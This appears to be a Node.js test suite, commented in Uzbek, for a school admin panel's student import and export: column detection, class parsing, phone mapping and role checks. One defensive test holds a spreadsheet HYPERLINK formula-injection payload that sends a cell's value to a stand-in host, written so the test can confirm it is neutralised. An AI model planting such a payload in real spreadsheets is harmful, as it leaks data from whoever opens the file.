// stu-import.test.mjs — O'quvchilar IMPORTI (Excel / CSV / Google Sheets), «Qabul» bo'limi va o'quvchi formasi (audit 2026-11-18,
//   A1-01…A1-13). admin.html'dan HAQIQIY kod o'qiladi: STU-ARCH / STU-IMP bloklari va nomi bo'yicha yuqori darajadagi funksiyalar
//   (buildAndPreviewImport, exportStudents, parseCSV …) — bazasiz (soxta loadCol / rpc), oldindan ko'rish oynasi o'rniga natija olinadi.
//   node --test assets/js/stu-import.test.mjs
//   Ma'lumotlar to'qima («Sinov …» ismlar, 99800… raqamlar).
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const ADM = readFileSync(new URL('../../admin.html', import.meta.url), 'utf8');
const T = '2026-11-18';
const block = tag => { const a = ADM.indexOf(`// ${tag}:BEGIN`), b = ADM.indexOf(`// ${tag}:END`); return a >= 0 && b > a ? ADM.slice(a, b) : ''; };
// Yuqori darajadagi funksiya (0-ustundan): bir qatorli yoki tanasi surilgan va «}» bilan yopiladigan ko'p qatorli.
function fn(name) {
  const L = ADM.split('\n'), i = L.findIndex(l => l.startsWith(`function ${name}(`) || l.startsWith(`async function ${name}(`));
  if (i < 0) return '';
  const out = [L[i]];
  for (let j = i + 1; j < L.length; j++) { const l = L[j]; if (l === '' || /^\s/.test(l)) { out.push(l); continue; } if (l.startsWith('}')) out.push(l); break; }
  return out.join('\n');
}
const plain = v => JSON.parse(JSON.stringify(v == null ? null : v));   // vm kontekstidagi qiymat -> oddiy obyekt

// Import muhiti: bazadagi o'quvchilar, maxfiy qatorlar (student_private), «Sinflar»; oldindan ko'rish natijasi `out`ga yoziladi.
function env({ students = [], priv = [], classes = [], hw = 0 } = {}) {
  const out = {};
  const ctx = vm.createContext({
    cache: {}, SESSION: { isAdmin: true, role: 'director', roles: ['director'] }, tkDay: () => T,
    toast: (m, bad) => { out.toast = m; out.bad = !!bad; },
    loadCol: async name => (name === 'students' ? students : name === 'student_private' ? priv : name === 'classes' ? classes : []).map(x => ({ ...x })),
    rpc: async f => (f === 'student_id_high_water' ? hw : {}),
    openImportPreview: (toWrite, warnings, skipped, toUpdate) => Object.assign(out, plain({ toWrite, warnings, skipped, toUpdate })),
    downloadCSV: (filename, headers, rows) => { out.csv = plain({ filename, headers, rows }); },
  });
  const names = ['nextId', 'gradeName', 'normName', 'normGrp', 'parseCSV', 'classKeyOf', 'classLabelOf', 'classDocKey', 'loadDefinedClasses', 'exportStudents', 'buildAndPreviewImport'];
  vm.runInContext([block('STU-ARCH'), block('STU-IMP'), ...names.map(fn)].join('\n') + '\n;this.__api = { buildAndPreviewImport, parseCSV, exportStudents };', ctx);
  return { api: ctx.__api, out };
}
async function imp(opts, rows) { const e = env(opts); await e.api.buildAndPreviewImport(rows); return e.out; }
// Sof yordamchilar (STU-IMP bloki) — alohida kontekstda
const H = (() => { const ctx = vm.createContext({}); vm.runInContext(block('STU-IMP') + '\n;this.__h = typeof impColumns === "function" ? { impColumns, impParseClass, impNormLetter, impResolveLetter, impKnownLetters, impCell, csvSafe, csvLine, admGradeOf, admLangOf, newStudentPrefill, impGradeNear } : null;', ctx); return ctx.__h; })();
const need = () => assert.ok(H, 'admin.html: STU-IMP bloki (import yordamchilari) yo‘q');
const src = name => fn(name);

// Bazadagi namunaviy o'quvchilar (to'qima) va ularning maxfiy qatorlari
const S1 = [
  { _id: 'IQ-0001', studentId: 'IQ-0001', name: 'Sinov Alijon', grade: 5, classLetter: 'A', lang: 'uz', payStatus: '' },
  { _id: 'IQ-0002', studentId: 'IQ-0002', name: 'Sinov Olga', grade: 7, classLetter: 'B', lang: 'ru', payStatus: '' },
  { _id: 'IQ-0003', studentId: 'IQ-0003', name: 'Sinov Bobur', grade: 10, classLetter: 'IT', track: 'IT', lang: 'uz', payStatus: '' },
];
const P1 = [
  { _id: 'IQ-0001', parentPhone: '+998 00 111 00 01', parentPhone2: '+998 00 222 00 01', fatherName: 'Sinov Ota Bir', motherName: 'Sinov Ona Bir' },
  { _id: 'IQ-0002', parentPhone: '+998 00 111 00 02', parentPhone2: '+998 00 222 00 02' },
  { _id: 'IQ-0003', parentPhone: '+998 00 111 00 03', parentPhone2: '+998 00 222 00 03' },
];
// Panelning o'z eksporti (⬇ CSV): haqiqiy exportStudents + downloadCSV bilan BIR XIL katak qoidasi (formula himoyasi ' bilan).
const q = v => { v = String(v == null ? '' : v); if (/^[=+\-@\t\r]/.test(v)) v = "'" + v; return /[",\n;]/.test(v) ? '"' + v.replace(/"/g, '""') + '"' : v; };
function panelExportCSV() {
  const e = env();
  e.api.exportStudents(S1.map(s => ({ ...s, ...P1.find(p => p._id === s._id) })));   // ro'yxatda maxfiy maydonlar qo'shilgan
  const { headers, rows } = e.out.csv;
  return [headers.map(q).join(',')].concat(rows.map(r => r.map(q).join(','))).join('\r\n');
}
const parse = text => { const e = env(); return e.api.parseCSV(text); };

test('formula himoyasi: test nusxasi admin.html qoidasi bilan bir xil', () => {
  assert.ok(ADM.includes('/^[=+\\-@\\t\\r]/'), 'admin.html CSV formula himoyasi');
});

// ===== A1-01: «Ota-ona tel.» ustuni onaning telefonini (parentPhone2) almashtirmasin; eksport ' belgisi qaytmasin =====
test('A1-01: panel eksporti o‘zgarishsiz qayta import — hech narsa yangilanmaydi (ona telefoni ham, \' ham yo‘q)', async () => {
  const csv = panelExportCSV();
  assert.ok(csv.split('\r\n')[0].includes('Ota-ona tel.'), 'eksport sarlavhasi');
  const o = await imp({ students: S1, priv: P1 }, parse(csv));
  assert.equal(o.toUpdate, undefined, 'oldindan ko‘rish ochilmaydi: ' + JSON.stringify(o.toUpdate || []));
  assert.match(String(o.toast), /allaqachon to‘g‘ri/);
});

test('A1-01: Excel’da bitta telefon tuzatildi — faqat shu o‘quvchining OTA telefoni, eski → yangi bilan; ona telefoni tegilmaydi', async () => {
  const csv = panelExportCSV().replace("'+998 00 111 00 01", "'+998 00 111 99 99");
  const o = await imp({ students: S1, priv: P1 }, parse(csv));
  assert.equal((o.toUpdate || []).length, 1, JSON.stringify(o.toUpdate || o.toast));
  const u = o.toUpdate[0];
  assert.equal(u.id, 'IQ-0001');
  assert.deepEqual(u.priv, { parentPhone: '+998 00 111 99 99' }, 'faqat parentPhone, \' siz');
  assert.equal(u.weak, false, 'ID bo‘yicha — belgilangan holda');
  assert.deepEqual(u.privChanges.map(p => [p.k, p.old, p.val]), [['parentPhone', '+998 00 111 00 01', '+998 00 111 99 99']]);
  assert.ok(!('grade' in u.data) && !('classLetter' in u.data), 'sinf o‘zgarmaydi');
});

test('A1-01: «Ota-onasi telefoni» va «Ota-ona F.I.Sh» — faqat ota maydonlariga; alohida «Ona telefoni» — onaga', async () => {
  const o = await imp({}, [['Ism', 'Sinf', 'Ota-onasi telefoni', 'Ota-ona F.I.Sh', 'Ona telefoni'], ['Sinov Yangi', '5-A', '+998 00 333 00 01', 'Sinov Ota', '+998 00 444 00 01']]);
  assert.deepEqual(o.toWrite[0].priv, { parentPhone: '+998 00 333 00 01', parentPhone2: '+998 00 444 00 01', fatherName: 'Sinov Ota' });
  const o2 = await imp({}, [['Ism', 'Sinf', 'Ota-onasi telefoni'], ['Sinov Yangi', '5-A', '+998 00 333 00 01']]);
  assert.deepEqual(o2.toWrite[0].priv, { parentPhone: '+998 00 333 00 01' }, 'ona telefoni bo‘lmaydi');
});

test('A1-01: impColumns — ota/ona so‘z boshida; «personal» / «работа» ichidagi «ona» / «ота» emas; kirill sarlavhalar', () => {
  need();
  const c = h => plain(H.impColumns([h, h.map(() => 'x')]));
  assert.equal(c(['Ism', 'Ota-ona tel.']).mPh, -1);
  assert.equal(c(['Ism', 'Ota-ona tel.']).fPh, 1);
  assert.equal(c(['Ism', 'Telefon (personal)']).anyPh, 1, '«personal» — ona emas');
  assert.equal(c(['Ism', 'Telefon (personal)']).mPh, -1);
  const r = c(['ФИО', 'Телефон отца', 'Телефон матери', 'Ф.И.О. матери', 'Класс']);
  assert.deepEqual([r.name, r.fPh, r.mPh, r.mNm, r.cls], [0, 1, 2, 3, 4]);
  assert.equal(c(['Ism', 'Телефон родителей']).fPh, 1, 'umumiy ota-ona telefoni — asosiy (ota) raqam');
  assert.equal(c(['Ism', 'Tartib raqami']).anyPh, -1, '«Tartib raqami» telefon emas');
});

test('A1-01: impCell — eksportdagi formula himoyasi (\') olib tashlanadi, oddiy apostrof qoladi', () => {
  need();
  assert.equal(H.impCell("'+998 00 111 00 01"), '+998 00 111 00 01');
  assert.equal(H.impCell("'=1+1"), '=1+1');
  assert.equal(H.impCell("O'g'il "), "O'g'il");
  assert.equal(H.impCell(null), '');
});

// ===== A1-02: sinf o'qilishi =====
test('A1-02: «5-sinf A», «7-sinf», «10-IT», «9-MED» — harf S / I / M bo‘lib qolmaydi', async () => {
  const o = await imp({}, [['Ism', 'Sinf', 'Telefon'], ['Sinov Bir', '5-sinf A', '+998 00 777 00 01'], ['Sinov Ikki', '7-sinf', '+998 00 777 00 02'], ['Sinov Uch', '10-IT', '+998 00 777 00 03'], ['Sinov Tort', '9-MED', '+998 00 777 00 04']]);
  assert.deepEqual(o.toWrite.map(x => [x.data.grade, x.data.classLetter]), [[5, 'A'], [7, ''], [10, 'IT'], [9, 'MED']]);
});

test('A1-02: kirill «7-Б» / «5-А» mavjud lotin sinfga moslanadi — o‘zgarish yo‘q (soxta kirill sinf yaratilmaydi)', async () => {
  const o = await imp({ students: S1, priv: P1 }, [['ФИО', 'Класс', 'Язык'], ['Sinov Olga', '7-Б', 'rus'], ['Sinov Alijon', '5-А', 'uz']]);
  assert.equal(o.toUpdate, undefined, JSON.stringify(o.toUpdate || []));
  assert.match(String(o.toast), /allaqachon to‘g‘ri/);
});

test('A1-02: bazadagi eski yozuvli harf («A », «b») — panel eksportini qayta import qilganda sinf kaliti o‘zgarmaydi', async () => {
  const st = [
    { _id: 'IQ-0011', studentId: 'IQ-0011', name: 'Sinov Bosh joy', grade: 4, classLetter: 'A ', lang: 'uz', payStatus: '' },
    { _id: 'IQ-0012', studentId: 'IQ-0012', name: 'Sinov Kichik harf', grade: 4, classLetter: 'b', lang: 'uz', payStatus: '' },
  ];
  const e = env(); e.api.exportStudents(st);
  const csv = [e.out.csv.headers.map(q).join(',')].concat(e.out.csv.rows.map(r => r.map(q).join(','))).join('\r\n');
  const o = await imp({ students: st }, parse(csv));
  assert.equal(o.toUpdate, undefined, JSON.stringify(o.toUpdate || []));
  assert.match(String(o.toast), /allaqachon to‘g‘ri/);
});

test('A1-02: «Guruh» ustuni «Sinf»dan oldin — sinf «Tayyorlov»ga tushmaydi; sinf ustuni yo‘q ro‘yxat — sinf o‘zgarmaydi', async () => {
  const o = await imp({ students: S1, priv: P1 }, [['Ism', 'Guruh', 'Sinf'], ['Sinov Alijon', 'A', '5']]);
  assert.equal(o.toUpdate, undefined, JSON.stringify(o.toUpdate || []));
  const o2 = await imp({ students: S1, priv: P1 }, [['Ism', 'Telefon'], ['Sinov Alijon', '+998 00 111 55 55']]);
  assert.equal((o2.toUpdate || []).length, 1, JSON.stringify(o2.toUpdate || o2.toast));
  assert.equal(o2.toUpdate[0].classChanged, false, 'faqat telefon');
  assert.ok(!('grade' in o2.toUpdate[0].data), 'sinf yozilmaydi');
});

test('A1-02: hali yo‘q sinfga ko‘chish belgilanadi (unknown), noaniq kirill harf — sinf o‘zgartirilmaydi', async () => {
  const o = await imp({ students: S1, priv: P1 }, [['ID', 'Ism', 'Sinf'], ['IQ-0001', 'Sinov Alijon', '5-C']]);
  assert.equal((o.toUpdate || []).length, 1, JSON.stringify(o.toUpdate || o.toast));
  assert.equal(o.toUpdate[0].unknown, true);
  assert.equal(o.toUpdate[0].data.classLetter, 'C');
  const o2 = await imp({ students: S1, priv: P1 }, [['ID', 'Ism', 'Sinf'], ['IQ-0001', 'Sinov Alijon', '5-В']]);   // kirill В: B yoki V?
  assert.equal((o2.toUpdate || []).length, 0);
  assert.ok(o2.warnings.some(w => /noaniq/.test(w)), JSON.stringify(o2.warnings));
  const o3 = await imp({ students: S1, priv: P1, classes: [{ grade: 5, letter: 'V', lang: 'uz' }] }, [['ID', 'Ism', 'Sinf'], ['IQ-0001', 'Sinov Alijon', '5-В']]);
  assert.equal(o3.toUpdate[0].data.classLetter, 'V', '«Sinflar»da faqat V bor — V');
  assert.equal(o3.toUpdate[0].unknown, false);
});

test('A1-02: impParseClass', () => {
  need();
  const p = v => plain(H.impParseClass(v));
  assert.deepEqual(p('5-sinf «A»'), { grade: 5, letter: 'A' });
  assert.deepEqual(p('11 кл. Б'), { grade: 11, letter: 'Б' });
  assert.deepEqual(p('7 класс'), { grade: 7, letter: '' });
  assert.deepEqual(p('Tayyorlov-B'), { grade: 0, letter: 'B' });
  assert.deepEqual(p('Подготовка'), { grade: 0, letter: '' });
  assert.deepEqual(p('Variativ'), { grade: 13, letter: '' });
  assert.deepEqual(p('13'), { grade: 13, letter: '' }, 'panel eksporti: Variativ — 13');
  assert.deepEqual(p('0'), { grade: 0, letter: '' });
  assert.deepEqual(p("10-sinf (IT yo‘nalishi)"), { grade: 10, letter: '' });
  assert.deepEqual(p('5/b'), { grade: 5, letter: 'B' });
  assert.equal(p(''), null, 'bo‘sh — ko‘rsatilmagan');
  assert.equal(p('A').bad, true);
  assert.equal(p('25').bad, true);
  assert.equal(p('5-A, 5-B').bad, true);
});

// ===== A1-03: ism bo'yicha moslash — faqat FAOL o'quvchilar, sinfi ±1; ID → JSHSHIR → ism =====
const ARC = { _id: 'IQ-0050', studentId: 'IQ-0050', name: 'Sinov Valiyev Ali', grade: 3, classLetter: 'A', lang: 'uz', payStatus: 'chiqdi', stopFrom: '2024-05-20', exitReason: 'kochdi' };
test('A1-03: arxivdagi adash — yangi qabul uning yozuviga ulanmaydi (YANGI o‘quvchi + ogohlantirish)', async () => {
  const o = await imp({ students: [ARC], hw: 50 }, [['F.I.Sh', 'Sinf', 'Ota telefoni', 'Ota F.I.Sh'], ['Sinov Valiyev Ali', '1-B', '+998 00 555 00 01', 'Sinov Valiyev Salim']]);
  assert.equal((o.toUpdate || []).length, 0, 'IQ-0050 yangilanmaydi');
  assert.equal((o.toWrite || []).length, 1);
  assert.notEqual(o.toWrite[0].id, 'IQ-0050');
  assert.ok(o.warnings.some(w => /arxivda shu ismli/.test(w)), JSON.stringify(o.warnings));
});

test('A1-03: arxivdagi o‘quvchi ID bilan ham import orqali o‘zgarmaydi', async () => {
  const o = await imp({ students: [ARC], priv: [{ _id: 'IQ-0050', parentPhone: '+998 00 666 00 01' }], hw: 50 }, [['ID', 'Ism', 'Sinf', 'Telefon'], ['IQ-0050', 'Sinov Valiyev Ali', '4-A', '+998 00 555 00 09']]);
  assert.equal((o.toUpdate || []).length, 0);
  assert.equal((o.toWrite || []).length, 0);
  assert.ok(o.warnings.some(w => /arxivda/.test(w)));
});

test('A1-03: faol adash, sinfi juda farq qiladi — boshqa bola (YANGI), mavjud o‘quvchi ko‘chmaydi', async () => {
  const o = await imp({ students: [{ _id: 'IQ-0060', studentId: 'IQ-0060', name: 'Sinov Karim', grade: 9, classLetter: 'A', lang: 'uz', payStatus: '' }], hw: 60 },
    [['Ism', 'Sinf'], ['Sinov Karim', '1-B']]);
  assert.equal((o.toUpdate || []).length, 0);
  assert.equal((o.toWrite || []).length, 1);
  assert.ok(o.warnings.some(w => /sinfi juda farq/.test(w)));
});

test('A1-03: faqat ism bo‘yicha topilgan (sinfi ±1) — «weak» (oldindan ko‘rishda belgilanmagan)', async () => {
  const o = await imp({ students: [{ _id: 'IQ-0061', studentId: 'IQ-0061', name: 'Sinov Lola', grade: 5, classLetter: 'A', lang: 'uz', payStatus: '' }] },
    [['Ism', 'Sinf'], ['Sinov Lola', '6-A']]);
  assert.equal((o.toUpdate || []).length, 1, JSON.stringify(o));
  assert.equal(o.toUpdate[0].weak, true);
  assert.equal(o.toUpdate[0].how, 'name');
  assert.equal(o.toUpdate[0].data.grade, 6);
});

test('A1-03: JSHSHIR ism bo‘yicha adashlardan ustun (aniq bola topiladi)', async () => {
  const st = [
    { _id: 'IQ-0071', studentId: 'IQ-0071', name: 'Sinov Aziz', grade: 5, classLetter: 'A', lang: 'uz', payStatus: '' },
    { _id: 'IQ-0072', studentId: 'IQ-0072', name: 'Sinov Aziz', grade: 5, classLetter: 'B', lang: 'uz', payStatus: '' },
  ];
  const o = await imp({ students: st, priv: [{ _id: 'IQ-0071', pinfl: '00000000000071' }] }, [['Ism', 'Sinf', 'JSHSHIR'], ['Sinov Aziz', '5-B', '00000000000071']]);
  assert.equal((o.toUpdate || []).length, 1, JSON.stringify(o));
  assert.equal(o.toUpdate[0].id, 'IQ-0071');
  assert.equal(o.toUpdate[0].how, 'pinfl');
  assert.equal(o.toUpdate[0].weak, false);
});

test('A1-03: oldindan ko‘rish — har yangilanish alohida belgilanadi, ism bo‘yicha topilganlar belgilanmagan', () => {
  const s = src('openImportPreview');
  assert.ok(s.includes('class="imp-u"') && s.includes("(!u.weak && !u.unknown)?' checked':''"), 'qator belgisi');
  assert.ok(s.includes('boxes().filter(c=>c.checked)'), 'faqat belgilanganlar saqlanadi');
  assert.ok(!s.includes('id="imp-upd" checked'), 'umumiy belgi oldindan qo‘yilmaydi');
});

// ===== A1-06: kirill sarlavhali ro'yxat; «№» ustuni ism bo'lmaydi =====
test('A1-06: «№ | Ф.И.О. учащегося | Класс | Телефон родителей» — ismlar va telefonlar to‘g‘ri', async () => {
  const o = await imp({}, [['№', 'Ф.И.О. учащегося', 'Класс', 'Телефон родителей'], ['1', 'Синов Бир', '5-А', '+998001112233'], ['2', 'Синов Икки', '5-А', '+998001112244']]);
  assert.deepEqual(o.toWrite.map(x => x.data.name), ['Синов Бир', 'Синов Икки']);
  assert.deepEqual(o.toWrite.map(x => x.priv.parentPhone), ['+998001112233', '+998001112244']);
  assert.deepEqual(o.toWrite.map(x => x.data.classLetter), ['A', 'A'], 'kirill «А» — lotin «A»');
});

test('A1-06: sarlavhasi tanilmagan ism ustuni — raqamli «T/r» ustuni ism bo‘lmaydi', async () => {
  const o = await imp({}, [['T/r', 'Talaba', 'Sinf'], ['1', 'Sinov Bir', '5-A'], ['2', 'Sinov Ikki', '5-A']]);
  assert.deepEqual(o.toWrite.map(x => x.data.name), ['Sinov Bir', 'Sinov Ikki']);
});

test('A1-06: oldindan ko‘rishda yangi o‘quvchilar ismi ko‘rinadi', () => {
  const s = src('openImportPreview');
  assert.ok(s.includes('<th>O‘quvchilar</th>') && s.includes('list.slice(0,6).map(x=>x.data.name)'));
});

// ===== A1-12: faollashtirish sanasi =====
test('A1-12: importdagi yangi o‘quvchi — faollashtirish sanasi bugun (oldindan ko‘rishda o‘zgartiriladi)', async () => {
  const o = await imp({}, [['Ism', 'Sinf'], ['Sinov Bir', '5-A']]);
  assert.equal(o.toWrite[0].data.activeFrom, T);
  const s = src('openImportPreview');
  assert.ok(s.includes('id="imp-af"') && s.includes('delete x.data.activeFrom'), 'sana maydoni (bo‘shatish mumkin)');
});

test('A1-12: yangi o‘quvchi formasi — «Faollashtirish sanasi» bugun bilan to‘ldiriladi', () => {
  need();
  assert.deepEqual(plain(H.newStudentPrefill(null, T)), { activeFrom: T });
  assert.deepEqual(plain(H.newStudentPrefill({ name: 'Sinov', activeFrom: '2026-12-01' }, T)), { name: 'Sinov', activeFrom: '2026-12-01' });
  assert.ok(src('openFormNow').includes("if(name==='students' && !isEdit) prefill=newStudentPrefill(prefill, tkDay(new Date()));"));
});

// ===== A1-13: «Guruh» harfi normalizatsiyasi =====
test('A1-13: impResolveLetter — registr, bo‘shliq, kirill harflar mavjud sinfga moslanadi', () => {
  need();
  const K = (...l) => new Map(l.map(x => [x.toUpperCase(), x]));
  const r = (v, k) => plain(H.impResolveLetter(v, k));
  assert.equal(r(' b ', K('A', 'B')).letter, 'B');
  assert.equal(r('а', K('A')).letter, 'A', 'kirill а');
  assert.equal(r('В', K('A', 'B')).letter, 'B', 'kirill В, faqat B bor');
  assert.equal(r('В', K('V')).letter, 'V', 'kirill В, faqat V bor');
  assert.deepEqual(r('В', K('B', 'V')).ambiguous, ['V', 'B'], 'ikkalasi bor — taxmin yo‘q');
  assert.ok(r('В', K()).ambiguous, 'hech biri yo‘q — taxmin yo‘q');
  assert.equal(r('Б', K()).letter, 'B');
  assert.equal(r('A', K('a')).letter, 'a', 'eski kichik harfli sinf — sinfdoshlar bilan qoladi');
  assert.equal(r('-', K('A')).letter, '');
  assert.equal(r('it', K('IT')).letter, 'IT');
  assert.equal(r('Matematika guruhi', K()).letter, null, 'harf emas — formada kiritilgani qoladi');
});

test('A1-13: forma «Guruh» harfini saqlashda moslaydi (faqat o‘zgartirilganda), noaniq kirill — rad', () => {
  const s = src('openFormNow');
  assert.ok(s.includes("impResolveLetter(data.classLetter, impKnownLetters(String(data.lang||'uz'), Number(data.grade)||0, activeRoster(cache.students||[]), cache.definedClasses||[]))"));
  assert.ok(s.includes("(!isEdit || data.classLetter!==String(_snapRaw.classLetter==null?'':_snapRaw.classLetter))"));
  assert.ok(s.includes('if(L.ambiguous){'));
});

// ===== A1-04: sayt arizasi (Qabul) =====
test('A1-04: admGradeOf / admLangOf — sayt matni («5-sinf», «Rus sinf», «Подготовка») va xodim qiymati', () => {
  need();
  const g = v => H.admGradeOf(v), l = v => H.admLangOf(v);
  assert.deepEqual(['5-sinf', '5 класс', 'Tayyorlov', 'Подготовка', '7', 7, '11-sinf', 'Variativ', '', 'abc', null].map(g), [5, 5, 0, 0, 7, 7, 11, 13, null, null, null]);
  assert.deepEqual(['Rus sinf', 'Русский класс', 'O‘zbek sinf', 'Узбекский класс', 'ru', 'uz', '', 'xyz'].map(l), ['ru', 'ru', 'uz', 'uz', 'ru', 'uz', '', '']);
});

test('A1-04: «Qabul» ro‘yxati, karta, «Jarayonda» va «✅ Qabul qilish» sayt matnini o‘qiydi', () => {
  const re = src('renderEnrollments'), ld = src('openLead');
  assert.ok(re.includes("admGradeOf(r.grade)===g"), 'Jarayonda');
  assert.ok(re.includes('admLangOf(r.direction)'), 'ro‘yxat tili');
  assert.ok(ld.includes("lg=admGradeOf(r.grade), ll=admLangOf(r.direction)"), 'karta');
  assert.ok(ld.includes("const prefill={ name:r.childName||'', grade:lg!=null?String(lg):'', lang:ll||'uz', parentPhone:r.phone||'' };"), 'qabul — sinf/til, ism faqat bola ismidan');
  assert.ok(ld.includes('Murojaat qiluvchi (saytda yozilgan ism)'), 'sayt ismi «Bola» emas');
});

// ===== A1-05: rollar =====
test('A1-05: «✅ Qabul qilish» faqat o‘quvchi qo‘sha oladiganlarga; eski «admin» roli — Qabulda yozish va sig‘im', () => {
  const ctx = vm.createContext({ SESSION: {} });
  vm.runInContext(['canManageStudents', 'canCreateStudents', 'canAdmWrite', 'canAdmSeats'].map(fn).join('\n') +
    '\n;this.__r = { cc: typeof canCreateStudents === "function" ? canCreateStudents : null, w: canAdmWrite, s: canAdmSeats };', ctx);
  const R = ctx.__r, as = s => { ctx.SESSION = s; };
  assert.ok(R.cc, 'canCreateStudents bor');
  as({ role: 'admin', roles: ['admin'], isAdmin: false }); assert.equal(R.w(), true, 'admin — yozadi'); assert.equal(R.s(), true, 'admin — sig‘im'); assert.equal(R.cc(), false);
  as({ role: 'admin_head', roles: ['admin_head'], isAdmin: false }); assert.equal(R.cc(), false, 'admin_head — o‘quvchi qo‘sha olmaydi (students_ins)'); assert.equal(R.w(), true);
  as({ role: 'admin_head', roles: ['admin_head', 'reception'], isAdmin: false }); assert.equal(R.cc(), true, 'qo‘shimcha qabulxona lavozimi');
  as({ role: 'reception', roles: ['reception'], isAdmin: false }); assert.equal(R.cc(), true);
  as({ role: 'zavuch', roles: ['zavuch'], isAdmin: false }); assert.equal(R.cc(), false);
  as({ role: 'director', roles: ['director'], isAdmin: true }); assert.equal(R.cc(), true);
  assert.ok(src('openLead').includes('if(!canCreateStudents()){'), 'qabul tugmasi tekshiruvi');
});

// ===== A1-07: Qabul CSV — formula himoyasi =====
test('A1-07: csvLine — har katak csvSafe dan o‘tadi; Qabul eksporti shundan foydalanadi', () => {
  need();
  assert.equal(H.csvLine(['=HYPERLINK("https://e.example/?p="&D3,"x")', '+998 00 1', 'Sinov'], ';'), `"'=HYPERLINK(""https://e.example/?p=""&D3,""x"")";"'+998 00 1";"Sinov"`);
  assert.equal(H.csvSafe('@SUM(1)'), "'@SUM(1)");
  assert.ok(src('renderEnrollments').includes(".map(a=>csvLine(a, ';')).join('\\n')"), 'Qabul eksporti');
  assert.ok(src('downloadCSV').includes('v=csvSafe(v)'), 'umumiy eksport — bitta qoida');
});

// ===== A1-09: sinov darsi o'qituvchisi — maoshsiz ko'rinishdan =====
test('A1-09: sinov darsi o‘qituvchilar ro‘yxati teachers_public dan', () => {
  const ld = src('openLead');
  assert.ok(ld.includes("teachers=await loadCol('teachers_public')"));
  assert.ok(!ld.includes("loadCol('teachers')"));
});

// ===== A1-10: Arxiv qarzi (eski «Ketganlar») — 'paid' faktura to'langan (regressiya qo'riqchisi) =====
test('A1-10: Arxiv sahifasi qarzi — status «paid» to‘liq to‘langan', () => {
  assert.ok(src('renderArchive').includes("paid=x.status==='paid'?amt:(Number(x.paidAmount)||0)"));
  assert.ok(!ADM.includes('function openLeavers('));
});

// ===== Mustaqil tekshiruv (G1 2-raund): sarlavha / sinf / harf chekka holatlari =====
test('G1-2: «Телефон мамы» / «Мамин телефон» — ona telefoni; «Тел. папы» — ota; ota raqami ustiga yozilmaydi', async () => {
  need();
  const c = h => plain(H.impColumns([h, h.map(() => 'x')]));
  assert.equal(c(['ФИО', 'Телефон мамы']).mPh, 1);
  assert.equal(c(['ФИО', 'Телефон мамы']).anyPh, -1, 'umumiy telefon emas');
  assert.equal(c(['ФИО', 'Мамин телефон']).mPh, 1);
  assert.equal(c(['ФИО', 'Тел. мамы']).mPh, 1);
  assert.equal(c(['ФИО', 'Телефон папы']).fPh, 1);
  assert.equal(c(['ФИО', 'Телефон отцу']).fPh, 1);
  const r = c(['ФИО', 'Телефон отца', 'Телефон мамы']);
  assert.deepEqual([r.fPh, r.mPh], [1, 2], 'ikkalasi — o‘z maydoniga');
  assert.equal(c(['ФИО', 'Отчество']).fNm, -1, '«Отчество» ota ustuni emas');
  // ID bilan topilgan o'quvchi: fayldagi ona raqami otaning (parentPhone) ustiga yozilmaydi
  const o = await imp({ students: S1, priv: P1 }, [['ID', 'ФИО', 'Класс', 'Телефон мамы'], ['IQ-0001', 'Sinov Alijon', '5-А', '+998 00 999 00 01']]);
  assert.equal((o.toUpdate || []).length, 1, JSON.stringify(o.toUpdate || o.toast));
  assert.deepEqual(o.toUpdate[0].priv, { parentPhone2: '+998 00 999 00 01' });
});

test('G1-2: «Telefon №», «Ota telefon №», «Tel. №» — telefon; «Tartib raqami», «Raqam (№)», «Т/р», «№ п/п» — telefon emas', () => {
  need();
  const c = h => plain(H.impColumns([h, h.map(() => 'x')]));
  assert.equal(c(['Ism', 'Telefon №']).anyPh, 1);
  assert.equal(c(['Ism', 'Tel. №']).anyPh, 1);
  assert.equal(c(['Ism', 'Ota telefon №']).fPh, 1);
  assert.equal(c(['Ism', 'Raqam']).anyPh, 1, '«raqam» yolg‘iz — avvalgidek telefon');
  for (const h of ['Tartib raqami', 'Raqam (№)', 'Тартиб рақами', '№ п/п', 'Т/р']) assert.equal(c(['Ism', h]).anyPh, -1, h);
});

test('G1-2: vasiy F.I.Sh ustuni — guardian («Vasiy F.I.Sh», «Vasiy ismi», «Опекун ФИО»)', async () => {
  need();
  const c = h => plain(H.impColumns([h, h.map(() => 'x')]));
  for (const h of ['Vasiy F.I.Sh', 'Vasiy ismi', 'Опекун ФИО', 'Vasiy']) assert.equal(c(['Ism', 'Sinf', h]).guard, 2, h);
  assert.equal(c(['Ism', 'Vasiy telefoni']).guard, -1, 'telefon — vasiy ismi emas');
  const o = await imp({}, [['Ism', 'Sinf', 'Vasiy F.I.Sh'], ['Sinov Vasiyli', '5-A', 'Sinov Vasiy']]);
  assert.equal(o.toWrite[0].priv.guardian, 'Sinov Vasiy');
});

test('G1-2: sinf katagidagi til so‘zi harf emas — «5-A rus» → 5-A (rus); «Til» ustuni bo‘lmasa til shundan', async () => {
  need();
  const p = v => plain(H.impParseClass(v));
  assert.deepEqual(p('5-A rus'), { grade: 5, letter: 'A', lang: 'ru' });
  assert.deepEqual(p('5 A ruscha'), { grade: 5, letter: 'A', lang: 'ru' });
  assert.deepEqual(p('5-sinf rus'), { grade: 5, letter: '', lang: 'ru' });
  assert.deepEqual(p('7-Б рус.'), { grade: 7, letter: 'Б', lang: 'ru' });
  assert.deepEqual(p("9-B o'zbek"), { grade: 9, letter: 'B', lang: 'uz' });
  assert.deepEqual(p('5-A (rus)'), { grade: 5, letter: 'A', lang: 'ru' });
  assert.deepEqual(p('5-A'), { grade: 5, letter: 'A' }, 'til so‘zisiz — avvalgidek');
  const o = await imp({}, [['Ism', 'Sinf'], ['Sinov Rus', '5-A rus']]);
  assert.deepEqual([o.toWrite[0].data.grade, o.toWrite[0].data.classLetter, o.toWrite[0].data.lang], [5, 'A', 'ru']);
  const o2 = await imp({}, [['Ism', 'Sinf', 'Til'], ['Sinov Uz', '5-A rus', "o'zbek"]]);
  assert.equal(o2.toWrite[0].data.lang, 'uz', '«Til» ustuni ustun turadi');
});

test('G1-2: import — kirill «В» faqat B mavjud bo‘lsa jim B ga qo‘shilmaydi (noaniq); forma — avvalgidek B', async () => {
  need();
  const K = (...l) => new Map(l.map(x => [x.toUpperCase(), x]));
  const r = (v, k, m) => plain(H.impResolveLetter(v, k, m));
  assert.deepEqual(r('В', K('A', 'B'), 'import').ambiguous, ['V', 'B']);
